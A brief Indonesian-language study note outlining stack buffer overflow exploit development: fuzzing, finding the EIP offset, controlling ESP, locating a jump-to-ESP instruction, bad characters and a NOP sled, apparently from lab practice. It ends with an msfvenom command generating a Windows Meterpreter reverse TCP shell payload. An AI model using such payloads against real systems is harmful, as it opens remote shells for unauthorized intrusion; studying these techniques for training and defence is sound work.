# Exploit Development Steps

## Fuzzing

1. menetukan besar buffer = 2900
2. menentukan offset eip, dimana eip mulai tertimpa data == jarak tertentu dari titik awal sebuah alamat memory = 2003

Alamat memori adalah pengenal unik yang menentukan lokasi byte atau kata tertentu dalam memori. Alamat memori biasanya direpresentasikan sebagai nilai heksadesimal dan digunakan oleh CPU untuk mengakses dan memanipulasi data yang tersimpan dalam memori.

Di sisi lain, offset adalah nilai relatif yang menentukan jarak antara dua alamat memori. Ini adalah perbedaan antara alamat memori byte atau word tertentu dan alamat dasar struktur data atau array yang menjadi bagiannya. Offset sering digunakan dalam bahasa pemrograman untuk mengakses elemen tertentu dalam array atau struktur data.

memastikan offset tersebut
perhatikan esp tertimpa oleh payload kita == esp dapat kita control -> mencari intruksi jump menuju esp

set breakpoit untuk memastikan kode yang bisa kita kontrol

menentukan bad code

memberikan nops sleed

```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=eth0 LPORT=4444 -f python -b "\x00"
```